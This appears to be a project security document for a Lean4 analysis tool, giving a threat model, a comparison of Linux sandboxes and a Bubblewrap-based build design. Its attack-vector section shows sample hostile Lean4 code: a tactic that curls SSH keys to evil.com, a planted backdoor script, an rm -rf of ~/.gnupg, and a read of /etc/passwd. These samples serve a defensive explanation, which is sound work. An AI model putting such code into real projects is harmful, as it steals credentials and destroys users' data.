# Security Considerations for doc-verification-bridge

This document provides a security analysis of the doc-verification-bridge compilation pipeline for cybersecurity professionals and auditors. It describes the threat model, attack vectors, and implemented security controls.

## Executive Summary

**Risk**: Compiling untrusted Lean4 code executes arbitrary code during the build process—tactics, macros, and elaborators run at compile-time with full system access.

**Mitigation**: A two-phase sandboxed build using Bubblewrap that:
1. Allows network access only during dependency fetching
2. Completely disables network during compilation (blocking exfiltration)
3. Restricts filesystem access to deny sensitive credentials

**Implementation**: See [`scripts/sandbox-lake.sh`](scripts/sandbox-lake.sh) and [`DocVerificationBridge/Experiments.lean`](DocVerificationBridge/Experiments.lean) (`runLake`, `runLakeLogged`)

## Table of Contents

- [Threat Model](#threat-model)
- [Attack Vectors](#attack-vectors)
- [Sandboxing Strategy Evaluation](#sandboxing-strategy-evaluation)
- [Implemented Security Controls](#implemented-security-controls)
- [Residual Risks](#residual-risks)
- [References](#references)

---

## Threat Model

### What doc-verification-bridge Does

The tool compiles and analyzes third-party Lean4 projects to extract theorem classifications and proof dependencies. The pipeline:

1. **Clones** external git repositories (configured in `experiments/config.toml`)
2. **Builds** projects using `lake build` (executes arbitrary Lean4 code)
3. **Loads** compiled modules via `envOfImports` (triggers `initialize` blocks)
4. **Analyzes** the resulting environment (read-only operations)

### The Fundamental Risk

**Lean4 is a full programming language where metaprogramming executes during compilation.**

Unlike traditional compilers that only parse and transform code, Lean4's elaboration system runs user-defined:
- **Tactics** — executed when proofs are elaborated
- **Macros** — executed during syntax expansion
- **Elaborators** — executed during term construction
- **`initialize` blocks** — executed at module load time
- **`#eval` commands** — executed during compilation

This means **compiling untrusted Lean4 code is equivalent to running arbitrary executables**.

---

## Attack Vectors

### 1. Malicious Tactics (Trojan Horse in Proofs)

A tactic invoked by any proof can execute IO:

```lean4
macro "innocent_tactic" : tactic => do
  -- Runs during elaboration when any proof uses this tactic
  let _ ← IO.Process.spawn { 
    cmd := "curl", 
    args := #["http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)"] 
  }
  `(tactic| sorry)
```

### 2. Malicious `initialize` Blocks

Execute when a module is loaded (even just imported):

```lean4
initialize do
  IO.FS.writeFile "/tmp/backdoor.sh" "#!/bin/sh\nmalicious_commands"
  discard <| IO.Process.spawn { cmd := "chmod", args := #["+x", "/tmp/backdoor.sh"] }
```

### 3. Malicious `#eval` Commands

Execute during compilation:

```lean4
#eval IO.Process.run { cmd := "rm", args := #["-rf", "~/.gnupg"] }
```

### 4. Malicious Macros and Elaborators

Custom syntax can hide malicious code:

```lean4
elab "compute_result" : term => do
  let secrets ← IO.FS.readFile "/etc/passwd"
  IO.eprintln secrets  -- Exfiltrate via stderr
  return mkConst ``True.intro
```

### 5. Supply Chain Attacks

Even "trusted" projects can be compromised:
- Malicious commits to dependencies
- Compromised CI/CD pipelines
- Typosquatting on package names

---

## Sandboxing Strategy Evaluation

We evaluated multiple Linux sandboxing approaches against our threat model. Based on the [HardenedLinux sandbox review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/) and current best practices:

### Option 1: Docker/Podman Containers

| Aspect | Assessment |
|--------|------------|
| **Security** | ⚠️ Moderate — shared kernel, container escape vulnerabilities exist |
| **Privilege** | ❌ Docker requires root daemon; Podman is rootless but still shares kernel |
| **Attack Surface** | ❌ Large — full container runtime, orchestration APIs |
| **Network Isolation** | ✅ Good — `--network=none` available |
| **Filesystem Isolation** | ✅ Good — overlay filesystem, volume mounts |
| **Ease of Use** | ✅ Excellent — widely understood, good tooling |
| **Lean4 Compatibility** | ✅ Good — standard Linux environment |

**Verdict**: Convenient but not the most secure option. Container escapes are regularly discovered, and the shared kernel is a fundamental limitation.

### Option 2: Firejail

| Aspect | Assessment |
|--------|------------|
| **Security** | ⚠️ Moderate — uses SUID binary (privilege escalation risk) |
| **Privilege** | ❌ Requires SUID root for namespace creation |
| **Attack Surface** | ⚠️ Medium — SUID binary is high-value target |
| **Network Isolation** | ✅ Good — network namespace support |
| **Filesystem Isolation** | ✅ Good — extensive profile system |
| **Ease of Use** | ✅ Excellent — many pre-built profiles, simple CLI |
| **Lean4 Compatibility** | ✅ Good — works with arbitrary programs |

**Verdict**: User-friendly but the SUID requirement is a security concern. The Firejail project has had CVEs related to privilege escalation.

### Option 3: Bubblewrap (bwrap)

| Aspect | Assessment |
|--------|------------|
| **Security** | ✅ High — minimal, unprivileged by design |
| **Privilege** | ✅ Unprivileged user namespaces (kernel >= 3.8) |
| **Attack Surface** | ✅ Minimal — small codebase, no daemon |
| **Network Isolation** | ✅ Good — network namespace support |
| **Filesystem Isolation** | ✅ Excellent — fine-grained bind mounts |
| **Ease of Use** | ❌ Poor — steep learning curve, manual configuration |
| **Lean4 Compatibility** | ✅ Good — used by Flatpak |

**Verdict**: Most secure dedicated sandbox but requires significant expertise to configure properly.

### Option 4: Bubblejail (Bubblewrap wrapper)

| Aspect | Assessment |
|--------|------------|
| **Security** | ✅ High — inherits Bubblewrap's security model |
| **Privilege** | ✅ Unprivileged (inherits from Bubblewrap) |
| **Attack Surface** | ✅ Small — Python wrapper over bwrap |
| **Network Isolation** | ✅ Good — service-based configuration |
| **Filesystem Isolation** | ✅ Excellent — separate home per instance |
| **Ease of Use** | ✅ Good — GUI and CLI, service-based config |
| **Lean4 Compatibility** | ⚠️ Unknown — designed for desktop apps |

**Verdict**: Promising middle ground—Bubblewrap security with better usability. However, it's designed for desktop applications, not build systems.

### Option 5: Virtual Machines (KVM/QEMU)

| Aspect | Assessment |
|--------|------------|
| **Security** | ✅ Highest — hardware-level isolation |
| **Privilege** | ⚠️ Requires KVM access (usually `kvm` group) |
| **Attack Surface** | ✅ Small at host level — larger guest surface |
| **Network Isolation** | ✅ Excellent — virtual network devices |
| **Filesystem Isolation** | ✅ Excellent — separate disk images |
| **Ease of Use** | ❌ Complex — requires VM management |
| **Lean4 Compatibility** | ✅ Excellent — full Linux environment |
| **Performance** | ❌ Significant overhead |

**Verdict**: Maximum isolation but impractical for frequent builds due to overhead.

### Option 6: Landlock (Kernel-based)

| Aspect | Assessment |
|--------|------------|
| **Security** | ✅ High — kernel-enforced, unprivileged |
| **Privilege** | ✅ Unprivileged syscalls |
| **Attack Surface** | ✅ Minimal — kernel-level, no userspace daemon |
| **Network Isolation** | ❌ Not supported (filesystem only) |
| **Filesystem Isolation** | ✅ Good — path-based restrictions |
| **Ease of Use** | ⚠️ Requires code integration |
| **Lean4 Compatibility** | ⚠️ Would require Lean4/Lake modifications |

**Verdict**: Excellent for filesystem restrictions but doesn't cover network isolation. Would require upstream Lean4 changes to integrate.

### Evaluation Summary

| Solution | Security | Attack Surface | Privilege Required | Selected |
|----------|----------|----------------|-------------------|----------|
| Docker/Podman | ⚠️ Medium | Large | Root daemon or rootless | ❌ |
| Firejail | ⚠️ Medium | Medium | SUID root | ❌ |
| **Bubblewrap** | ✅ High | Minimal | Unprivileged | ✅ |
| Bubblejail | ✅ High | Small | Unprivileged | Considered |
| VMs (KVM) | ✅ Highest | Small | KVM group | ❌ Overhead |
| Landlock | ✅ High | Minimal | Unprivileged | ❌ No network control |

**Selection Rationale**: Bubblewrap provides the best security-to-usability ratio for our use case. It operates unprivileged, has a minimal attack surface (~2000 lines of C), and is battle-tested through Flatpak's widespread deployment.

---

## Implemented Security Controls

This section describes the security controls implemented in [`scripts/sandbox-lake.sh`](scripts/sandbox-lake.sh).

### Control 1: Two-Phase Build Isolation

**Rationale**: Lean4's Lake build system separates dependency fetching from compilation. We leverage this architecture to apply different security policies to each phase.

| Phase | Commands | Network | Threat Mitigated |
|-------|----------|---------|------------------|
| **Dependency Fetch** | `lake update`, `lake exe cache get` | ✅ Allowed | N/A (required for operation) |
| **Compilation** | `lake build` | ❌ Blocked | Data exfiltration, C2 communication, payload download |

**Key Insight**: There is no legitimate need for network access during Lean4 compilation. All compile-time features (tactics, macros, elaborators, `initialize` blocks, `#eval`) operate on local data only. Any network access during compilation is either a bug or malicious.

### Control 2: Network Namespace Isolation

**Mechanism**: Bubblewrap's `--unshare-net` creates an isolated network namespace with no interfaces.

**Effect**: 
- All socket operations fail with `ENETUNREACH` or name resolution failures
- No loopback interface (blocks localhost communication)
- DNS resolution fails (`Could not resolve host`)

**Verification**: Any compile-time code attempting `curl`, `wget`, or socket connections will fail:
```
curl: (6) Could not resolve host: example.com
```

### Control 3: Filesystem Access Restrictions

**Mechanism**: Bubblewrap's bind-mount model provides allowlist-based filesystem access.

**Allowed (Read-Only)**:
| Path | Purpose |
|------|---------|
| `/usr`, `/lib`, `/lib64`, `/bin` | System binaries and libraries |
| `/etc/resolv.conf`, `/etc/ssl`, `/etc/ca-certificates` | Network configuration and TLS (Phase 1 only effective) |
| `/etc/passwd`, `/etc/group` | User/group name resolution |
| `~/.elan` | Lean4 toolchain |

**Allowed (Read-Write)**:
| Path | Purpose |
|------|---------|
| Project directory | Source code and build artifacts |
| `~/.cache` | Lake package cache |
| `/tmp` (tmpfs) | Temporary files (ephemeral) |

**Denied (Implicit)**:

Sensitive paths are protected by simply not mounting them into the sandbox:

| Path | Contains |
|------|----------|
| `~/.ssh` | SSH private keys |
| `~/.gnupg` | GPG private keys |
| `~/.aws` | AWS credentials |
| `~/.config/gcloud` | GCP service account keys |
| `~/.kube` | Kubernetes configs and tokens |
| `~/.docker` | Docker registry credentials |
| `~/.npmrc`, `~/.netrc` | HTTP authentication tokens |
| `/etc/shadow` | Password hashes |

### Control 4: Process Isolation

**Namespaces Applied**:
| Namespace | Flag | Effect |
|-----------|------|--------|
| PID | `--unshare-pid` | Process tree isolated; cannot see/signal host processes |
| UTS | `--unshare-uts` | Hostname isolated |
| IPC | `--unshare-ipc` | System V IPC isolated; cannot access host shared memory |
| Cgroup | `--unshare-cgroup` | Cgroup hierarchy isolated |
| Network | `--unshare-net` | Network stack isolated (Phase 2 only) |

**Additional Process Controls**:
- `--die-with-parent`: Sandbox terminates if parent dies (prevents orphaned processes)
- `--new-session`: Creates new session (blocks terminal hijacking)

### Control 5: Resource Limits (Optional)

When combined with `systemd-run`, the sandbox can enforce resource limits:

| Resource | Limit | Purpose |
|----------|-------|---------|
| Memory | 8 GB | Prevent memory exhaustion DoS |
| CPU | 400% | Prevent CPU monopolization |
| Tasks | 200 | Prevent fork bombs |
| Runtime | 3600s | Prevent infinite compilation loops |

---

## Residual Risks

The following risks are **not fully mitigated** by the current implementation:

### 1. Phase 1 (Dependency Fetch) Attack Window

**Risk**: Malicious code could execute during `lake update` or `lake exe cache get` when network is enabled.

**Mitigation**: Filesystem restrictions still apply—credentials are inaccessible. However, exfiltration of project source code or environment variables is theoretically possible.

**Future Enhancement**: Consider fetching dependencies in a more restricted sandbox that only allows HTTPS to known-good hosts (GitHub, leanprover.github.io).

### 2. Local Privilege Escalation

**Risk**: Kernel vulnerabilities in namespace implementation could allow sandbox escape.

**Mitigation**: Bubblewrap uses only unprivileged namespaces, reducing attack surface. Keep kernel updated.

### 3. Side-Channel Attacks

**Risk**: Timing attacks, cache-based side channels, or Spectre-class vulnerabilities.

**Mitigation**: Out of scope for application-level sandboxing. Requires hardware/kernel mitigations.

### 4. Supply Chain Compromise

**Risk**: Malicious code in upstream dependencies (mathlib4, batteries) that has been merged legitimately.

**Mitigation**: Network isolation during compilation prevents exfiltration even if malicious code executes. Code review of dependencies is the primary defense.

### 5. Denial of Service

**Risk**: Malicious code could consume excessive resources or cause infinite loops.

**Mitigation**: Optional resource limits via `systemd-run`. Currently not enforced by default.

---

## Comparison: Bubblewrap vs Docker

Security professionals often ask why we chose Bubblewrap over Docker/Podman. Key factors:

| Factor | Bubblewrap | Docker |
|--------|------------|--------|
| **Attack Surface** | ~2000 lines of C | Large (containerd, runc, overlay drivers, plugins) |
| **Privilege Model** | Unprivileged user namespaces | Root daemon (or complex rootless setup) |
| **Design Intent** | Security sandboxing | Deployment isolation |
| **CVE History** | Minimal | Regular container escape CVEs |
| **Dependencies** | None (statically linked) | Many components |

Docker/Podman remain acceptable for trusted projects where convenience outweighs security, or in CI/CD environments already using container infrastructure.

---

## References

1. HardenedLinux. "GNU/Linux Sandboxing - A Brief Review." August 2024.  
   https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/

2. Bubblewrap Project.  
   https://github.com/containers/bubblewrap

3. Bubblejail Project.  
   https://github.com/igo95862/bubblejail

4. Madaidan. "Linux Security & Privacy."  
   https://madaidans-insecurities.github.io/linux.html

5. Landlock LSM.  
   https://landlock.io/

6. Dunlap et al. "A Study of Application Sandbox Policies in Linux." SACMAT 2022.  
   https://dl.acm.org/doi/10.1145/3532105.3535016

7. Lean4 Metaprogramming Book.  
   https://leanprover-community.github.io/lean4-metaprogramming-book/

---

## Changelog

| Date | Change |
|------|--------|
| 2026-01-19 | Initial security analysis, threat model, and sandbox implementation |
